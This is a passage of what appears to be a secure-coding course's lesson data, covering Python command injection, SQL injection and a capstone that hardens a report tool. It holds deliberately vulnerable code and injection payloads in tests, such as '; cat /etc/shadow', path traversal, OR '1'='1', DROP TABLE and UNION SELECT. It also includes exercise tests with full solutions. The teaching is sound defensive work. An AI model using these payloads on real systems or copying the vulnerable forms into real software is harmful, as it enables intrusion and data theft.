            code: `assert extract("q4.csv", "zzzz-not-present") == "", f"got {extract('q4.csv', 'zzzz-not-present')!r}"`,
          },
          {
            name: "report names are allowlisted",
            code: `for bad in ("../etc/passwd", "q4.csv; ls", "q4.txt", "", "a" * 50 + ".csv", "sub/q4.csv", "q4.csv "):
    with raises(ValueError):
        extract(bad, "emea")`,
          },
          {
            name: "patterns are bounded and control characters refused",
            code: `for bad in ("", "x" * 61, "a\\nb", "a\\x00b", "a\\rb", None, 5):
    with raises(ValueError):
        extract("q4.csv", bad)`,
          },
          {
            name: "the subprocess call takes a list",
            code: `WORLD.reset()
extract("q4.csv", "emea")
assert WORLD.transcript, "no command was recorded"
line = WORLD.transcript[-1]
assert line.startswith("$ grep"), f"unexpected command: {line!r}"
assert not WORLD.breached`,
          },
        ],
        requirements: [
          { kind: "defines", value: "extract" },
          { kind: "uses_module", value: "subprocess" },
          { kind: "no_finding", value: "PY-SHELL-TRUE" },
          { kind: "no_finding", value: "PY-SHELL-EXEC" },
          { kind: "no_finding", value: "PY-CMD-BUILD" },
        ],
        hints: [
          "The argument list is `[\"grep\", \"--\", pattern, f\"/srv/reports/{report}\"]`. Each element is exactly one argument, whatever characters it contains.",
          "Control characters: `any(ord(c) < 32 for c in pattern)` catches newline, carriage return and NUL — the characters that could split a line in a log or truncate a C string.",
          "`check=False` plus an explicit exit-code test is clearer here than `check=True` wrapped in a try, because exit status 1 from grep means 'no matches', not failure.",
          "Return `result.stdout` when the return code is 0 or 1, and raise `RuntimeError` for anything else — a missing file or a broken binary is a genuine error.",
        ],
        solution: `import re
import subprocess

REPORT = re.compile(r"\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z")
MAX_PATTERN = 60
BASE = "/srv/reports/"


def extract(report, pattern):
    """Search a report for a pattern, without ever invoking a shell."""
    if not isinstance(report, str) or not REPORT.match(report):
        raise ValueError("report name not permitted")

    if not isinstance(pattern, str) or not 1 <= len(pattern) <= MAX_PATTERN:
        raise ValueError(f"pattern must be 1 to {MAX_PATTERN} characters")
    if any(ord(ch) < 32 for ch in pattern):
        raise ValueError("pattern must not contain control characters")

    result = subprocess.run(
        ["grep", "--", pattern, BASE + report],
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )

    if result.returncode in (0, 1):       # 1 == no matches, which is not an error
        return result.stdout
    raise RuntimeError(f"grep failed with status {result.returncode}")


print(extract("q4.csv", "emea"))
print(extract("q4.csv", "emea; cat /etc/shadow"))
print("breached:", WORLD.breached)`,
        why: `The hostile pattern is still hostile — it still contains \`;\` and \`cat /etc/shadow\` — and it no longer matters, because nothing will ever parse it as a command. That is the difference between escaping and structure: escaping tries to make dangerous text safe, while the list form removes the parser that made it dangerous.

Three supporting decisions:

- **\`--\` before the pattern.** Without it, a pattern of \`-e\` or \`--file=/etc/shadow\` becomes a *flag* to grep. The shell is gone but argument injection is not, and \`--\` is the standard way to close that door.
- **The report name is allowlisted, not escaped.** It is interpolated into a path, so the defence is the Module 2 rule: describe what is acceptable, reject everything else.
- **Exit status 1 is handled explicitly.** \`check=True\` would raise on "no matches", and the obvious fix — wrapping the call in \`try/except subprocess.CalledProcessError: return ""\` — would also swallow real failures like a missing file. Distinguishing 1 from everything else keeps the error channel honest.

The breach ledger returning empty is the proof. Not "I reviewed it and it looks fine" — the simulated shell was never asked to parse anything.`,
      },
      wrapup: `- \`os.system\`, \`os.popen\` and \`shell=True\` hand a language to the attacker. Never with untrusted data.
- A list argument means each element is exactly one argument. Metacharacters become ordinary text.
- \`shell=False\` does not stop argument injection — validate values and use \`--\`.
- The best subprocess is the one you replace with a library call.`,
      refs: [
        { label: "subprocess — security considerations", url: "https://docs.python.org/3/library/subprocess.html#security-considerations" },
        { label: "CWE-78: OS Command Injection", url: "https://cwe.mitre.org/data/definitions/78.html" },
      ],
    },

    /* ----------------------------------------------------------------- 24 */
    {
      id: "m05l04",
      day: 24,
      title: "SQL injection, with a real database",
      minutes: 60,
      secure: "parameterised queries",
      cwe: ["CWE-89"],
      tags: ["sql", "sqlite3", "injection", "parameters", "orm"],
      lede:
        "`sqlite3` is built into Python and into this page. You will write the injectable query, watch it return rows it should not, and then fix it with the one mechanism that actually works.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          stdin: ["x' OR '1'='1"],
          code: `import sqlite3

con = sqlite3.connect(":memory:")
con.execute("CREATE TABLE users (name TEXT, role TEXT)")
con.execute("INSERT INTO users VALUES ('ada', 'member')")
con.execute("INSERT INTO users VALUES ('root', 'admin')")

name = input("name: ")
rows = con.execute(
    "SELECT * FROM users WHERE name = '" + name + "'"
).fetchall()
print(rows)

# input:  x' OR '1'='1
# query:  SELECT * FROM users WHERE name = 'x' OR '1'='1'
# result: every row, including root/admin`,
        },
        {
          t: "box",
          kind: "try",
          title: "See it return the admin row",
          md: `Load that into the editor and run it. The exercise's stdin supplies the payload. The database is real SQLite — this is not a simulation.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `rows = con.execute(
    "SELECT * FROM users WHERE name = ?", (name,)
).fetchall()`,
          cap: "The query text is fixed and the value travels separately. SQLite parses the statement once, then binds the value as data — there is no path by which it becomes syntax.",
        },
        {
          t: "box",
          kind: "rule",
          title: "Parameters are not escaping",
          md: `Escaping tries to neutralise dangerous characters in a string that will still be *parsed as SQL*. Every escaping scheme has edge cases — character sets, nested quoting, numeric contexts where no quotes exist at all.

Parameter binding never parses your value. The statement and the data travel in different fields of the protocol. That is a structural guarantee, not a filter.`,
        },
        {
          t: "table",
          head: ["Driver", "Placeholder style", "Example"],
          rows: [
            ["`sqlite3`", "qmark", "`WHERE id = ?`, `(uid,)`"],
            ["`sqlite3` (named)", "named", "`WHERE id = :uid`, `{\"uid\": uid}`"],
            ["`psycopg` (PostgreSQL)", "pyformat", "`WHERE id = %s`, `(uid,)`"],
            ["`mysqlclient`", "format", "`WHERE id = %s`, `(uid,)`"],
            ["SQLAlchemy Core", "bound params", "`select(t).where(t.c.id == uid)`"],
          ],
        },
        {
          t: "box",
          kind: "pitfall",
          title: "`%s` is a placeholder, not string formatting",
          md: `\`\`\`
cur.execute("SELECT * FROM t WHERE id = %s" % uid)      # INJECTABLE
cur.execute("SELECT * FROM t WHERE id = %s", (uid,))    # safe
\`\`\`

One character of difference — \`%\` versus \`,\` — and the first builds the string in Python while the second hands the value to the driver. This is the most common way the bug survives a code review.`,
        },
        { t: "h", text: "What cannot be parameterised" },
        {
          t: "p",
          md: `Placeholders bind **values**, never identifiers or syntax. Table names, column names, \`ASC\`/\`DESC\` and \`LIMIT\` keywords cannot be parameters. When those must vary, map from an allowlist:`,
        },
        {
          t: "code",
          label: "fixed",
          code: `SORT_COLUMNS = {"name": "name", "created": "created_at", "role": "role"}
DIRECTIONS = {"asc": "ASC", "desc": "DESC"}

def list_users(con, sort="name", direction="asc", limit=50):
    column = SORT_COLUMNS[sort]            # KeyError on anything unexpected
    order = DIRECTIONS[direction]
    limit = max(1, min(int(limit), 200))
    sql = f"SELECT name, role FROM users ORDER BY {column} {order} LIMIT ?"
    return con.execute(sql, (limit,)).fetchall()`,
          cap: "The f-string interpolates only values that came out of a dict you wrote. The user's string selects a key; it never reaches the SQL.",
        },
        {
          t: "box",
          kind: "cve",
          title: "Still the top of the list",
          md: `SQL injection has been in the OWASP Top Ten since the list existed, and remains among the highest-ranked entries in the CWE Top 25. The reason is not that the fix is hard — it is one character — but that the vulnerable form is the one that is easiest to type, and it works perfectly until someone types a quote.`,
        },
      ],
      spot: {
        label: "search endpoint",
        prompt: "Click the line an attacker controls the grammar of.",
        lines: [5],
        why:
          "Line 5. The f-string makes `term` part of the SQL text, so `%' OR '1'='1` returns every row and `%'; DROP TABLE docs--` ends the statement and starts another. Line 7's parameterised call is the correct form — the fix is to make line 5 look like line 7.",
        code: `def search(con, term, owner_id):
    rows = con.execute(
        f"SELECT id, title FROM docs "
        f"WHERE owner_id = {owner_id} AND title LIKE '%{term}%'"
    ).fetchall()
    audit = con.execute(
        "INSERT INTO search_log (owner_id, term) VALUES (?, ?)", (owner_id, term)
    )
    return rows`,
      },
      quiz: [
        {
          q: "Why do parameters defeat injection when escaping often fails?",
          options: [
            "Parameters escape quotes more thoroughly.",
            "The value is never parsed as SQL — statement and data travel separately.",
            "Parameters are encrypted.",
          ],
          answer: 1,
          why:
            "Escaping leaves the value inside a string that still gets parsed. Binding removes the parse step for that value entirely, so there is no grammar to break out of.",
        },
        {
          q: "`cur.execute(\"... WHERE id = %s\" % uid)` versus `cur.execute(\"... WHERE id = %s\", (uid,))`:",
          options: [
            "Equivalent.",
            "The first formats in Python and is injectable; the second binds via the driver.",
            "The first is faster and equally safe.",
          ],
          answer: 1,
          why: "`%` formats before `execute` ever sees it. The comma passes the value to the driver. Grep your codebase for `execute(` followed by `%` or an f-string.",
        },
        {
          q: "A user picks the sort column. How do you do it safely?",
          options: [
            "Parameterise the column name with `?`.",
            "Map the user's choice through a dict of permitted column names.",
            "Escape the column name.",
          ],
          answer: 1,
          why:
            "Identifiers cannot be bound as parameters. The user's string must select a key, never contribute text to the statement.",
        },
      ],
      exercise: {
        title: "A search function that survives the payload",
        brief: `A table is created for you in the setup (do not recreate it): \`docs(id INTEGER, owner_id INTEGER, title TEXT, secret TEXT)\`, with rows owned by users 1 and 2 — including one owned by user 2 whose \`secret\` is \`"classified"\`.

Write \`search(con, owner_id, term, *, sort="title", limit=20)\`:

- Return a list of \`(id, title)\` tuples for rows where \`owner_id\` matches **and** \`title\` contains \`term\` (case-insensitive substring, i.e. SQL \`LIKE\` with \`%\` on both sides).
- \`owner_id\` must be an \`int\` (reject \`bool\`), else \`TypeError\`.
- \`term\` must be a \`str\` of 1–60 characters, else \`ValueError\`. Any characters are allowed — quotes and semicolons are legitimate search text.
- \`sort\` selects the ORDER BY column from an allowlist of \`"title"\` and \`"id"\`; anything else raises \`ValueError\`.
- \`limit\` is clamped to 1–100.
- Never select or return the \`secret\` column.

Use \`?\` placeholders. Build the \`LIKE\` wildcards in Python (\`f"%{term}%"\` as a *bound value*, not as SQL text).`,
        rubric: [
          "Finds the owner's matching rows and returns `(id, title)` pairs",
          "`' OR '1'='1` returns no rows and does not escape the owner filter",
          "`'; DROP TABLE docs; --` leaves the table intact",
          "The `secret` column is never returned",
          "`sort` is allowlisted; `limit` is clamped",
          "Auditor reports no `PY-SQLI`",
        ],
        setup: `import sqlite3
_con = sqlite3.connect(":memory:")
_con.execute("CREATE TABLE docs (id INTEGER, owner_id INTEGER, title TEXT, secret TEXT)")
_con.executemany("INSERT INTO docs VALUES (?, ?, ?, ?)", [
    (1, 1, "Q4 revenue", "none"),
    (2, 1, "Q3 revenue", "none"),
    (3, 1, "team offsite", "none"),
    (4, 2, "merger plan", "classified"),
])
_con.commit()
CON = _con
`,
        starter: `SORT_COLUMNS = {"title": "title", "id": "id"}
MAX_TERM = 60


def search(con, owner_id, term, *, sort="title", limit=20):
    """Return [(id, title)] for the owner's documents matching term."""


# CON is provided by the exercise setup, already populated.
print(search(CON, 1, "revenue"))
print(search(CON, 1, "' OR '1'='1"))
`,
        stdin: [],
        tests: [
          {
            name: "finds the owner's matching rows",
            code: `got = search(CON, 1, "revenue")
assert sorted(got) == [(1, "Q4 revenue"), (2, "Q3 revenue")], f"got {got!r}"`,
          },
          {
            name: "matching is a case-insensitive substring",
            code: `assert search(CON, 1, "REVENUE"), "LIKE should be case-insensitive for ASCII"
assert search(CON, 1, "ffsit") == [(3, "team offsite")], f"got {search(CON, 1, 'ffsit')!r}"`,
          },
          {
            name: "the classic payload returns nothing",
            code: `for payload in ("' OR '1'='1", "x' OR 1=1 --", "%' OR '1'='1", "' UNION SELECT id, secret FROM docs --"):
    got = search(CON, 1, payload)
    assert got == [], f"payload {payload!r} returned rows: {got!r}"`,
          },
          {
            name: "the owner filter cannot be escaped",
            code: `for payload in ("' OR owner_id=2 --", "%' OR owner_id = 2 OR title LIKE '%"):
    got = search(CON, 1, payload)
    assert all(doc_id != 4 for doc_id, _ in got), f"leaked another owner's row: {got!r}"`,
          },
          {
            name: "the table survives a stacked-query attempt",
            code: `search(CON, 1, "x'; DROP TABLE docs; --")
assert CON.execute("SELECT COUNT(*) FROM docs").fetchone()[0] == 4, "the table was modified"`,
          },
          {
            name: "secrets are never returned",
            code: `for term in ("", "a"):
    pass
rows = search(CON, 2, "merger")
assert rows == [(4, "merger plan")], f"got {rows!r}"
assert all(len(r) == 2 for r in rows), "return only (id, title)"
assert "classified" not in str(rows)`,
          },
          {
            name: "sort is allowlisted",
            code: `assert search(CON, 1, "revenue", sort="id")
for bad in ("secret", "title; DROP TABLE docs", "title ASC", "", None):
    with raises(ValueError):
        search(CON, 1, "revenue", sort=bad)`,
          },
          {
            name: "limit is clamped and arguments are typed",
            code: `assert len(search(CON, 1, "e", limit=1)) == 1
assert len(search(CON, 1, "e", limit=0)) >= 1, "limit must clamp up to 1, not disable the query"
assert len(search(CON, 1, "e", limit=10_000)) <= 100
for bad in ("1", 1.0, None, True):
    with raises(TypeError):
        search(CON, bad, "revenue")
for bad in ("", "x" * 61, None, 5):
    with raises(ValueError):
        search(CON, 1, bad)`,
          },
        ],
        requirements: [
          { kind: "defines", value: "search" },
          { kind: "no_finding", value: "PY-SQLI" },
        ],
        hints: [
          "The statement is fixed text: `\"SELECT id, title FROM docs WHERE owner_id = ? AND title LIKE ? ORDER BY ...\"`. Only the ORDER BY column comes from your allowlist dict.",
          "Build the wildcard pattern in Python and bind it: `pattern = f\"%{term}%\"` then pass `(owner_id, pattern, limit)` as the parameter tuple. The `%` characters are part of the *value*, not the SQL.",
          "`SORT_COLUMNS[sort]` raises `KeyError`, which is not the `ValueError` the tests want — use `if sort not in SORT_COLUMNS: raise ValueError(...)`.",
          "SQLite's `LIKE` is already case-insensitive for ASCII, so you do not need `LOWER()` on either side.",
        ],
        solution: `SORT_COLUMNS = {"title": "title", "id": "id"}
MAX_TERM = 60


def search(con, owner_id, term, *, sort="title", limit=20):
    """Return [(id, title)] for the owner's documents matching term."""
    if isinstance(owner_id, bool) or not isinstance(owner_id, int):
        raise TypeError("owner_id must be an int")

    if not isinstance(term, str) or not 1 <= len(term) <= MAX_TERM:
        raise ValueError(f"term must be 1 to {MAX_TERM} characters")

    if sort not in SORT_COLUMNS:
        raise ValueError(f"sort must be one of {sorted(SORT_COLUMNS)}")
    column = SORT_COLUMNS[sort]

    if isinstance(limit, bool) or not isinstance(limit, int):
        raise TypeError("limit must be an int")
    limit = max(1, min(limit, 100))

    sql = (
        "SELECT id, title FROM docs "
        "WHERE owner_id = ? AND title LIKE ? "
        f"ORDER BY {column} LIMIT ?"
    )
    pattern = f"%{term}%"
    return con.execute(sql, (owner_id, pattern, limit)).fetchall()


# CON is provided by the exercise setup, already populated.
print(search(CON, 1, "revenue"))
print(search(CON, 1, "' OR '1'='1"))`,
        why: `The payload \`' OR '1'='1\` is searched for *as text*. SQLite looks for documents whose title contains the literal characters \`' OR '1'='1\`, finds none, and returns an empty list. The quote never terminates anything because the value was never parsed as SQL.

Note precisely where the f-string is and is not used. \`column\` is interpolated because identifiers cannot be bound — but its value came out of \`SORT_COLUMNS\`, a dict written by hand, so the only strings that can ever appear there are \`"title"\` and \`"id"\`. The user's \`sort\` argument selects a key; it contributes no characters to the statement. Everything the user *does* control — the owner id, the search pattern, the limit — travels as a bound parameter.

Two smaller decisions:

- **The \`%\` wildcards are built in Python and bound.** Writing \`LIKE '%' || ? || '%'\` also works, but building the pattern as a value keeps the SQL text constant, which makes it greppable and lets the driver cache the prepared statement.
- **\`limit\` is clamped rather than rejected**, and still passed as a parameter. Clamping keeps pagination usable; binding keeps \`LIMIT 1; DROP TABLE\` impossible even though the value is a number.`,
      },
      wrapup: `- Placeholders bind values; the statement text stays constant. That is structural, not a filter.
- \`execute(sql % x)\` and \`execute(f"...{x}")\` are the bug. \`execute(sql, (x,))\` is the fix.
- Identifiers cannot be parameters — map user choices through a dict you wrote.
- Grep your codebase for \`execute(\` adjacent to \`%\`, \`+\` or \`f"\`.`,
      refs: [
        { label: "sqlite3 — placeholders", url: "https://docs.python.org/3/library/sqlite3.html#sqlite3-placeholders" },
        { label: "CWE-89: SQL Injection", url: "https://cwe.mitre.org/data/definitions/89.html" },
        { label: "OWASP SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
      ],
    },

    /* ----------------------------------------------------------------- 25 */
    {
      id: "m05l05",
      day: 25,
      title: "Capstone: harden the report tool",
      minutes: 60,
      secure: "layered injection defence",
      cwe: ["CWE-78", "CWE-89", "CWE-22"],
      tags: ["capstone", "injection", "subprocess", "sqlite3", "allowlist"],
      lede:
        "One tool, three injection surfaces: a file path, an external command, and a database query. Fix all three and prove it with a breach ledger that stays empty.",
      blocks: [
        {
          t: "p",
          md: `Here is the tool as it exists in too many repositories. Every line of it was written by someone competent who was in a hurry.`,
        },
        {
          t: "code",
          label: "vulnerable",
          code: `import os, sqlite3

def report(con, name, owner, search):
    os.system(f"cp /srv/reports/{name} /tmp/{name}.bak")          # 1
    rows = con.execute(
        f"SELECT * FROM docs WHERE owner_id = {owner} "
        f"AND title LIKE '%{search}%'"
    ).fetchall()                                                  # 2
    with open(f"/srv/reports/{name}") as fh:                      # 3
        body = fh.read()
    return rows, body`,
          cap: "Three different injection classes in six lines: shell, SQL, and path traversal — each one reachable from a single CLI argument.",
        },
        {
          t: "table",
          head: ["Surface", "Defence", "Why that one"],
          rows: [
            ["Shell command", "argv list, no shell", "Removes the parser rather than filtering its input."],
            ["SQL", "bound parameters", "Value is never parsed as SQL."],
            ["File path", "allowlist + confinement", "Interpolation into a path is unavoidable, so the value must be constrained."],
            ["Numbers", "`int()` then clamp", "Stops a numeric field carrying text."],
            ["Identifiers (columns)", "dict lookup", "Cannot be bound; must be selected."],
          ],
        },
        {
          t: "box",
          kind: "rule",
          title: "The order of defences",
          md: `1. **Remove the interpreter** where you can — no shell, no \`eval\`, no dynamic attribute access.
2. **Separate code from data** where an interpreter is required — bound parameters, argv lists.
3. **Constrain the value** where interpolation is unavoidable — allowlists, bounds, canonical forms.

Each layer is independent. A tool with all three is not three times safer; it is safe against three different mistakes.`,
        },
        {
          t: "box",
          kind: "good",
          title: "Proving it, not asserting it",
          md: `The exercise below is graded on evidence: hostile input goes in, and \`WORLD.breached\` must be \`False\` afterwards. The simulated shell records what an attacker *achieved*, not what your code intended.

This is the habit worth taking to real work — write the attack as a test. A regression that re-opens the hole then fails the suite instead of surviving to production.`,
        },
      ],
      quiz: [
        {
          q: "Which defence applies where interpolation is genuinely unavoidable, such as a file path?",
          options: [
            "Escaping the value.",
            "Constraining the value with an allowlist, then confining the result.",
            "Encrypting the value.",
          ],
          answer: 1,
          why:
            "You cannot bind a path as a parameter, so the only option is to narrow what the value may be — and then verify the resolved result stays where you intended.",
        },
        {
          q: "Why test with a payload rather than reviewing the code?",
          options: [
            "Tests are faster to write.",
            "A test fails when a future change re-opens the hole; a review protects only the day it happened.",
            "Reviews cannot detect injection.",
          ],
          answer: 1,
          why: "Security regressions are regressions. Encode them in the suite and they stay fixed.",
        },
        {
          q: "You have parameterised the query and removed `shell=True`. The path is still `open(f\"/srv/{name}\")`. Are you done?",
          options: [
            "Yes, the two big ones are fixed.",
            "No — `name` can still be `../../etc/passwd`.",
            "Yes, provided `name` is a string.",
          ],
          answer: 1,
          why: "Three surfaces, three defences. Fixing two leaves the third, and an attacker only needs one.",
        },
      ],
      exercise: {
        title: "report_tool: all three surfaces closed",
        brief: `Rewrite the vulnerable tool. The database is provided in the setup as \`CON\` with \`docs(id, owner_id, title, secret)\`.

Implement \`report(con, name, owner_id, search, *, sort="title")\` returning a dict:

\`\`\`
{"rows": [(id, title), ...], "backup": "<path>", "lines": <int>}
\`\`\`

Requirements:

1. **Path** — \`name\` must match \`\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z\`, else \`ValueError\`. The report lives at \`/srv/reports/<name>\`.
2. **Command** — make the backup with \`subprocess.run\` using an argument list (the simulated \`cp\` is not available, so use \`["wc", "/srv/reports/<name>"]\` to count lines instead, and return \`"/tmp/" + name + ".bak"\` as the nominal backup path). No shell, ever. Parse the line count from \`wc\`'s first output field; if the command fails, raise \`RuntimeError\`.
3. **SQL** — \`owner_id\` must be an \`int\` (not \`bool\`), \`search\` a 1–60 character \`str\`. Query with placeholders; \`sort\` selects from \`{"title", "id"}\`; never select \`secret\`.
4. After running with hostile values, \`WORLD.breached\` must be \`False\`.`,
        rubric: [
          "Legitimate input returns rows, a backup path and a line count",
          "Hostile `name`, `search` and `owner_id` values are rejected or neutralised",
          "`WORLD.breached` is `False` after every hostile call",
          "No `shell=True`, no `os.system`, no string-built SQL",
          "`secret` is never returned",
        ],
        setup: `import sqlite3
_con = sqlite3.connect(":memory:")
_con.execute("CREATE TABLE docs (id INTEGER, owner_id INTEGER, title TEXT, secret TEXT)")
_con.executemany("INSERT INTO docs VALUES (?, ?, ?, ?)", [
    (1, 1, "Q4 revenue", "none"),
    (2, 1, "Q3 revenue", "none"),
    (3, 2, "merger plan", "classified"),
])
_con.commit()
CON = _con
`,
        starter: `import re
import subprocess

REPORT = re.compile(r"\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z")
SORT_COLUMNS = {"title": "title", "id": "id"}
BASE = "/srv/reports/"
MAX_SEARCH = 60


def report(con, name, owner_id, search, *, sort="title"):
    """Return {'rows': [...], 'backup': str, 'lines': int} with every surface closed."""


print(report(CON, "q4.csv", 1, "revenue"))
print("breached:", WORLD.breached)
`,
        stdin: [],
        tests: [
          {
            name: "the happy path works",
            code: `WORLD.reset()
got = report(CON, "q4.csv", 1, "revenue")
assert sorted(got["rows"]) == [(1, "Q4 revenue"), (2, "Q3 revenue")], f"got {got['rows']!r}"
assert got["backup"] == "/tmp/q4.csv.bak", f"got {got['backup']!r}"
assert isinstance(got["lines"], int) and got["lines"] > 0, f"got {got['lines']!r}"
assert not WORLD.breached, WORLD.report()`,
          },
          {
            name: "path traversal in name is rejected",
            code: `for bad in ("../../etc/passwd", "q4.csv; cat /etc/shadow", "/etc/shadow", "q4.csv ", "sub/q4.csv", "q4.exe", ""):
    with raises(ValueError):
        report(CON, bad, 1, "revenue")`,
          },
          {
            name: "no shell is ever invoked",
            code: `WORLD.reset()
report(CON, "q4.csv", 1, "revenue")
assert not WORLD.breached, f"a breach was recorded: {WORLD.report()}"
assert any(t.startswith("$ wc") for t in WORLD.transcript), f"transcript: {WORLD.transcript!r}"`,
          },
          {
            name: "SQL payloads find nothing and change nothing",
            code: `WORLD.reset()
before = CON.execute("SELECT COUNT(*) FROM docs").fetchone()[0]
for payload in ("' OR '1'='1", "x'; DROP TABLE docs; --", "' UNION SELECT id, secret FROM docs --"):
    got = report(CON, "q4.csv", 1, payload)
    assert got["rows"] == [], f"payload {payload!r} returned {got['rows']!r}"
assert CON.execute("SELECT COUNT(*) FROM docs").fetchone()[0] == before, "the table changed"
assert not WORLD.breached, WORLD.report()`,
          },
          {
            name: "other owners' rows and secrets stay hidden",
            code: `got = report(CON, "q4.csv", 1, "merger")
assert got["rows"] == [], f"leaked another owner's row: {got['rows']!r}"
got2 = report(CON, "q4.csv", 2, "merger")
assert got2["rows"] == [(3, "merger plan")], f"got {got2['rows']!r}"
assert "classified" not in str(got2)`,
          },
          {
            name: "arguments are typed and bounded",
            code: `for bad in ("1", 1.5, None, True):
    with raises(TypeError):
        report(CON, "q4.csv", bad, "revenue")
for bad in ("", "x" * 61, None, 7):
    with raises(ValueError):
        report(CON, "q4.csv", 1, bad)
for bad in ("secret", "title; DROP TABLE docs", None):
    with raises(ValueError):
        report(CON, "q4.csv", 1, "revenue", sort=bad)`,
          },
          {
            name: "a missing report is a RuntimeError, not a crash",
            code: `WORLD.reset()
try:
    report(CON, "does_not_exist.csv", 1, "revenue")
except RuntimeError:
    pass
except ValueError:
    pass
assert not WORLD.breached, WORLD.report()`,
          },
        ],
        requirements: [
          { kind: "defines", value: "report" },
          { kind: "no_finding", value: "PY-SHELL-TRUE" },
          { kind: "no_finding", value: "PY-SHELL-EXEC" },
          { kind: "no_finding", value: "PY-SQLI" },
          { kind: "no_finding", value: "PY-CMD-BUILD" },
        ],
        hints: [
          "Validate everything first, in one block at the top. A function that validates as it goes will eventually run half of itself on bad input.",
          "`subprocess.run([\"wc\", BASE + name], capture_output=True, text=True, timeout=10)` — the path is a single list element, so even a name full of metacharacters would be one argument (and the regex has already rejected it anyway).",
          "The simulated `wc` prints `\"<count> <path>\"`. `result.stdout.split()[0]` is the count; wrap the `int()` in a check so a missing file raises `RuntimeError` rather than `IndexError`.",
          "The SQL is the previous lesson's: fixed text with `?` placeholders, the ORDER BY column taken from `SORT_COLUMNS`, and `f\"%{search}%\"` bound as a value.",
        ],
        solution: `import re
import subprocess

REPORT = re.compile(r"\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z")
SORT_COLUMNS = {"title": "title", "id": "id"}
BASE = "/srv/reports/"
MAX_SEARCH = 60


def _validate(name, owner_id, search, sort):
    """Every argument check in one place, before anything is executed."""
    if not isinstance(name, str) or not REPORT.match(name):
        raise ValueError("report name not permitted")
    if isinstance(owner_id, bool) or not isinstance(owner_id, int):
        raise TypeError("owner_id must be an int")
    if not isinstance(search, str) or not 1 <= len(search) <= MAX_SEARCH:
        raise ValueError(f"search must be 1 to {MAX_SEARCH} characters")
    if sort not in SORT_COLUMNS:
        raise ValueError(f"sort must be one of {sorted(SORT_COLUMNS)}")


def _count_lines(path):
    """Run an external tool with an argument list -- no shell anywhere."""
    result = subprocess.run(
        ["wc", path],
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )
    parts = result.stdout.split()
    if result.returncode != 0 or not parts or not parts[0].isdigit():
        raise RuntimeError(f"could not read {path}")
    return int(parts[0])


def report(con, name, owner_id, search, *, sort="title"):
    """Return {'rows': [...], 'backup': str, 'lines': int} with every surface closed."""
    _validate(name, owner_id, search, sort)

    path = BASE + name
    lines = _count_lines(path)

    sql = (
        "SELECT id, title FROM docs "
        "WHERE owner_id = ? AND title LIKE ? "
        f"ORDER BY {SORT_COLUMNS[sort]} LIMIT ?"
    )
    rows = con.execute(sql, (owner_id, f"%{search}%", 100)).fetchall()

    return {"rows": rows, "backup": f"/tmp/{name}.bak", "lines": lines}


print(report(CON, "q4.csv", 1, "revenue"))
print("breached:", WORLD.breached)`,
        why: `Each surface is closed by the defence that fits it, and the three are independent — breaking one does not expose the others.

**The path** is the only place where untrusted text is still concatenated into something, and it is the only place where that is unavoidable. The regex is therefore doing real work: it is the whole defence, so it is anchored, bounded, and permits a character set with no \`/\`, no \`.\` except the extension, and no whitespace.

**The command** uses a list, so the path is one argument regardless of its contents. Note that this holds even though the regex already rejected metacharacters — the two layers are deliberately redundant, because the regex might be loosened next year by someone who does not know it is the only thing standing between \`name\` and \`/bin/sh\`.

**The query** keeps its text constant and binds every value, including the limit. The \`ORDER BY\` column is interpolated from \`SORT_COLUMNS\`, so the only strings that can reach it are two literals in this file.

Validation lives in \`_validate\` and runs before anything executes. That ordering matters more than it looks: a function that checks the name, runs the subprocess, then checks the search term has already acted on partially-validated input — and in a tool that writes files or sends mail, that partial action is the incident.`,
      },
      wrapup: `- Remove the interpreter, separate code from data, constrain what is left. In that order.
- Redundant layers are a feature: the second one survives a careless edit to the first.
- Validate every argument before executing anything.
- Write the payload as a test. Security regressions are regressions.`,
      refs: [
        { label: "OWASP Command Injection Defense", url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" },
        { label: "CWE-89, CWE-78, CWE-22", url: "https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html" },
      ],
    },
  ],
};
